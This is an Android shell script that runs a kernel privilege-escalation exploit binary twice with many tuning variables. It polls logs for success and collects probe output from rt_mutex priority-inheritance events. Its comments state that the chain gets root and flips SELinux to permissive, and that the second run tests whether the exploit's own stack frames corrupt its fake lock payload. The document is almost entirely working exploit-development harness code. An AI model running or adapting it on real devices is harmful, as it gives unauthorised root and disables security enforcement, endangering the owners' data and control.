#!/system/bin/sh
# PROBE RUN for experiment 2.
#  attempt 1: normal consumer-fire chain (gets root, flips permissive) then
#             the arm18 agent arms the pi probe (logs w0..w8 of every
#             rt_mutex_adjust_pi with pib!=0 to pi18.log, O_SYNC).
#  attempt 2: SELF-FIRE (SLIDE_SG_SELF=1).  If the fire's own stack frames
#             (LSM hook) clobber the ghost, the pi event for THIS fire will
#             show w7 != fake_lock / w8 != 0x82 instead of our payload.
D=/data/local/tmp
cd $D || exit 1
rm -f armed_ok agent_started ps1.log ps2.log pi18.log kmsg_sync18.txt
rm -rf $D/dumplogs
mkdir -p $D/dumplogs

LOG=$D/ps1.log
( DURABLE_LOG=$LOG FLIP_PERMISSIVE=1 NO_RSCAN=1 KSU_LOADER=0 \
  AGENT_SCRIPT=$D/arm18.sh SYSCTL_WALK_ATTEMPTS=1 SLIDE_SELFCONTAINED=1 \
  SLIDE_SIGNAL_WAKE=1 SLIDE_WAIT_SECS=0 SLIDE_SIGRET_BUF_BYTE=0x10 \
  SLIDE_NO_RESTORE=1 KS_MAX_TRIES=1 SLIDE_NOKILL=1 WALK_TRACE=1 \
  ./exploit_static > /dev/null 2>&1 & )
n=0
while [ $n -lt 60 ]; do
  grep -q 'chain complete' $LOG 2>/dev/null && break
  sleep 2; n=$((n+1))
done
if ! grep -q 'chain complete' $LOG 2>/dev/null; then
  echo "ATTEMPT1-FAIL"
  tail -6 $LOG 2>&1
  exit 1
fi
echo "ATTEMPT1-OK"
n=0
while [ $n -lt 20 ]; do
  [ -f $D/armed_ok ] && break
  sleep 2; n=$((n+1))
done
echo "armed_ok: $(ls $D/armed_ok 2>&1)"
n=0
while [ $n -lt 40 ]; do
  pgrep -f 'data/local/tmp/exploit_static' >/dev/null 2>&1 || break
  sleep 2; n=$((n+1))
done
echo "exploit procs: $(pgrep -f 'data/local/tmp/exploit_static' | tr '\n' ' ')"

LOG2=$D/ps2.log
( DURABLE_LOG=$LOG2 FLIP_PERMISSIVE=1 NO_RSCAN=1 KSU_LOADER=0 \
  SYSCTL_WALK_ATTEMPTS=1 SLIDE_SELFCONTAINED=1 SLIDE_SIGNAL_WAKE=1 \
  SLIDE_WAIT_SECS=0 SLIDE_SIGRET_BUF_BYTE=0x10 \
  SLIDE_NO_RESTORE=1 KS_MAX_TRIES=1 SLIDE_NOKILL=1 WALK_TRACE=1 \
  SLIDE_SG_SELF=1 \
  ./exploit_static > /dev/null 2>&1 & )
n=0
while [ $n -lt 45 ]; do
  grep -q 'C1S\|chain complete' $LOG2 2>/dev/null && break
  sleep 2; n=$((n+1))
done
echo "ATTEMPT2 tail:"
tail -8 $LOG2 2>&1
echo "PI fire events:"
grep 'pib=0xffffff' $D/pi18.log 2>/dev/null | tail -4
